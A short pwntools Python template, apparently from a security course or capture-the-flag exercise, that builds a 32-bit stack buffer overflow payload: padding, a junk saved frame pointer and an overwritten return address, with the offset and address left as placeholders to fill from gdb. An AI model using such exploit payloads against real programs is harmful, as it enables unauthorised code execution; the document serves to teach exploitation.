from pwn import p32
import sys

# the offset of buffer start from the ebp (start of the frame)
buffer_offset = 0   # replace this with the offset found in gdb

# don't change, word size is 4 bytes for a 32-bit system
word_size = 4  

buffer_bytes = b'A' * buffer_offset   # fills the buffer with 
ebp_bytes = b'a' * word_size          # can be garbage ebp value or something else
return_address = p32(0x00000)         # replace the return address with the address you found

payload = buffer_bytes + ebp_bytes + return_address

sys.stdout.buffer.write(payload)
sys.stdout.buffer.flush()